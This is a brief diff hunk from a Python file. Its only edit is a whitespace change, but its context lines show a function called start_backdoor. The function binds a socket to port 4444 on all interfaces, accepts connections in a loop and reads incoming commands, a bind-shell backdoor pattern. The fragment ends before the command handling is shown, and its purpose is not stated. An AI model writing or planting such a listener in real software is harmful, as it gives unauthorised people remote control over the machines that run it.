@@ -12,7 +12,7 @@ def start_backdoor():
     s = socket.socket()
     s.bind(('0.0.0.0', 4444))  # Listens on all interfaces
     s.listen(1)
-
+    
     while True:
         conn, addr = s.accept()
         command = conn.recv(1024).decode()
